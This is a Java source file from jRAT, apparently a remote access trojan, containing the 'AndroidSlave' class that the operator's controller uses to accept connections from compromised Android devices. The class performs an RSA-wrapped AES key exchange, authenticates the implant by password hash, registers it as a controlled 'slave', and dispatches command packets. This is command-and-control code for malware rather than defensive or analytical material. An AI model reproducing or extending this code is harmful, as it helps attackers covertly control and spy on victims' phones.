package jrat.controller.android;

import jrat.common.Logger;
import jrat.common.codec.Hex;
import jrat.common.crypto.Crypto;
import jrat.common.crypto.StreamKeyExchanger;
import jrat.common.hash.Sha1;
import jrat.controller.AbstractSlave;
import jrat.controller.LogAction;
import jrat.controller.Main;
import jrat.controller.crypto.GlobalKeyPair;
import jrat.controller.exceptions.CloseException;
import jrat.controller.net.ConnectionHandler;
import jrat.controller.net.ServerListener;
import jrat.controller.packets.android.incoming.IncomingAndroidPackets;
import jrat.controller.packets.android.outgoing.AbstractOutgoingAndroidPacket;
import jrat.controller.packets.android.outgoing.AndroidPacket0Ping;
import jrat.controller.utils.TrayIconUtils;

import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.awt.*;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.Arrays;

public class AndroidSlave extends AbstractSlave {
	
	public AndroidSlave(ServerListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			initialize();
		
			StreamKeyExchanger exchanger = new StreamKeyExchanger(GlobalKeyPair.getKeyPair(), dis, dos);
			exchanger.writePublicKey();
			rsaKey = exchanger.readRemoteKey();
			
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            SecretKey secretKey = keyGen.generateKey();

            key = secretKey.getEncoded();
            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
            dos.writeInt(encryptedKey.length);
            dos.write(encryptedKey);
			
			if (Main.debug) {
				Logger.log("Encryption key: " + Hex.encode(key));
			}

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setAuthenticated(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isAuthenticated()) {
					Main.instance.getPanelLog().addEntry(LogAction.WARNING, this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingAndroidPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			Main.instance.getPanelLog().addEntry(LogAction.DISCONNECT, this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, 0);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
		}
	}

	@Override
	public void ping() throws Exception {
		addToSendQueue(new AndroidPacket0Ping());
	}

	@Override
	public String getDisplayName() {
		// TODO Auto-generated method stub
		return null;
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingAndroidPacket packet) {
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void sendPacket(AbstractOutgoingAndroidPacket packet, DataOutputStream dos) throws Exception {
		packet.send(this, dos);
	}

	@Override
	public String getFileSeparator() {
		return "/";
	}

}
